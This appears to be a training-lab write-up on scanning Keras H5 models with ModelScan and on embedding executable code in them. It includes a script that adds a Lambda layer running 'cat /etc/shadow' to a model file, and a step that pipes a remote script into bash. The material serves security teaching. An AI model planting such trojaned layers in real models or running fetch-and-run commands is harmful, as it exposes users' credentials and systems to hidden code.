---
description: >-
  Scanning Models and Injecting Malicious Code
title: Scanning Models and Injecting Malicious Code  # Add title here
date: 2025-11-29 08:00:00 -0600                           # Change the date to match completion date
categories: [23 AI and ML attack, 04 Threat Modeling]                     # Change Templates to Writeup
tags: [AI, Model Scan, Malicious Code Injection]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---

#### Introduction
The lab is not about creating a super helpful model or a chatbot, but understanding how to embed executable code inside a model.

#### Requirements
```bash
mkdir malicious-models
cd malicious-models
cat>requirements.txt<<EOF
tensorflow==2.18.0
scikit-learn==1.6.1
numpy==2.0.2
EOF
pip install -r requirements.txt

```

#### Creating Benign Models
We will not care about how the model is built, or trained. Rather, we will simply download code that will create a model for us.
```bash
wget -O - https://gitlab.practical-devsecops.training/-/snippets/83/raw/main/train-benign-keras-model.sh | bash
```

#### Consuming the Model
Let’s execute the python script named keras-model-consumer.py to see if the model is working.

```bash
python3 keras-model-consumer.py
```

#### Scanning Models for Malicious Code with ModelScan

ModelScan is an open source project from Protect AI that scans models to determine if they contain unsafe code. It is the first model scanning tool to support multiple model formats. ModelScan currently supports: H5, Pickle, and SavedModel formats. This protects you when using PyTorch, TensorFlow, Keras, Sklearn, XGBoost, with more on the way.

##### Requirements
```bash
pip install modelscan==0.8.5
```
Usage:
```bash
modelscan -p keras_model.h5
```
Output:
```bash
[[[...SNIPPED...]]]
No settings file detected at /root/malicious-models/modelscan-settings.toml. Using defaults. 

Scanning /root/malicious-models/keras_model.h5 using modelscan.scanners.H5LambdaDetectScan model scan

--- Summary ---

 No issues found! 
```

.h5 files (HDF5 format) are commonly used in machine learning, particularly with frameworks like TensorFlow and Keras, for storing and managing large datasets and trained models.

#### Injecting Malicious Code into Models

The keras_model.h5 file is a benign model, and the non malicious nature of the keras_model.h5 file is established in the previous step by using the modelscan tool.

The details of how the model keras_model.h5 was created is not something that was very well known to us. And it is not something that we are going to explore in this lab.

We are going to assume that we now have a model file named keras_model.h5, and we are going to explore ways of embedding malicious code into the model.

##### HDF5 Formats and Lambda Functions
H5 models, that is the HDF5 are a type of model format that is used in machine learning, particularly with frameworks like TensorFlow and Keras, for storing and managing large datasets and trained models.

While H5 models can’t inherently contain malicious code, they can contain lambda functions, which can be used to embed malicious code.

Lambda functions in H5 models are stored in the `/layers/0/config/lambda_function` field.

So, we will be trying to add a lambda function as another layer in the model, and see if we can embed malicious code in the lambda function.

Let’s list files in the current working directory to review the important files we will be using in this step.

1. keras_model.h5 is the file we will read, and inject executable code into.
2. keras-model-consumer.py is the script that will be used to consume the model, with a slight modification.
3. We will not change anything else because our goal is to inject malicious code into an existing model, and not create a new model with executable code with training involved.

#### Adding a Lambda Function to the Model

We are going to create a file named trojanizing-h5-model.py, and inject executable code in to the .h5 model file named keras_model.h5.

```bash
cat>trojanizing-h5-model.py<<EOF
import os
os.environ["CUDA_VISIBLE_DEVICES"] = "-1"

from tensorflow.keras.models import load_model
from tensorflow.keras.layers import Lambda
from tensorflow.keras import Model
h5model = load_model("keras_model.h5")
malice = (
    lambda x: os.system(
        """cat /etc/shadow"""
    )
    or x
)
lambda_layer = Lambda(malice)(h5model.outputs[-1])
trojan_model = Model(inputs=h5model.inputs, outputs=lambda_layer)

#trojan_model.save("trojan_keras_model.h5")

trojan_model.save("keras_model_trojanized.h5")
print("[✔] Keras model trained and saved as " + "keras_model_trojanized.h5")
EOF
```
Usage:
```bash
python3 trojanizing-h5-model.py
```

